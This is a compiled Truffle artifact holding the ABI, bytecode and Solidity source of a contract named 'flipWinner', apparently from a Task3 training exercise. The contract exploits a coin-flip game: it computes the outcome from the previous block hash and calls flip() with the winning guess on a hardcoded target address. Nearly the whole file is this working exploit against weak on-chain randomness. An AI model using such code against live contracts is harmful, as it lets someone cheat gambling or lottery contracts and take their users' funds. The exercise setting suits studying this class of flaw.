{
  "contractName": "flipWinner",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "win",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b5073847b63decb567161f0c53be219680b69690564d06000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061036e806100986000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063473ca96c14610030575b600080fd5b61003861003a565b005b60006001436100499190610210565b4060001c905060006001548261005f9190610273565b9050600060018214610072576000610075565b60015b905060011515811515036101265760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760016040518263ffffffff1660e01b81526004016100dd91906102bf565b6020604051808303816000875af11580156100fc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610120919061030b565b506101d2565b60001515811515036101d15760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760006040518263ffffffff1660e01b815260040161018c91906102bf565b6020604051808303816000875af11580156101ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101cf919061030b565b505b5b505050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061021b826101d7565b9150610226836101d7565b925082820390508181111561023e5761023d6101e1565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061027e826101d7565b9150610289836101d7565b92508261029957610298610244565b5b828204905092915050565b60008115159050919050565b6102b9816102a4565b82525050565b60006020820190506102d460008301846102b0565b92915050565b600080fd5b6102e8816102a4565b81146102f357600080fd5b50565b600081519050610305816102df565b92915050565b600060208284031215610321576103206102da565b5b600061032f848285016102f6565b9150509291505056fea26469706673582212201bb51c8659abb454d6e1635dc332d9e506c4961707abcf5522562d8c5d8f140c64736f6c63430008110033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.8.17;\ninterface Iflip{\nfunction flip(bool a) external returns(bool);\n}\n\npragma solidity ^0.8.17; \n\ncontract flipWinner{\n    Iflip interfaceFlip;\n    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    constructor(){\n        interfaceFlip = Iflip(0x847b63dECb567161f0C53be219680b69690564d0);\n    }\n    function win() external {\n        uint256 value = uint256(blockhash(block.number-1));\n        uint256 coin = value/factor;\n        bool side = coin ==1 ? true : false;\n\n        if(side == true){\n            interfaceFlip.flip(true);\n        }\n        else if (side == false){\n            interfaceFlip.flip(false);\n        }\n    }\n\n}",
  "sourcePath": "/home/tk-lpt-0788/Desktop/tasks/Task3/contracts/Contract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-01-09T12:37:27.376Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}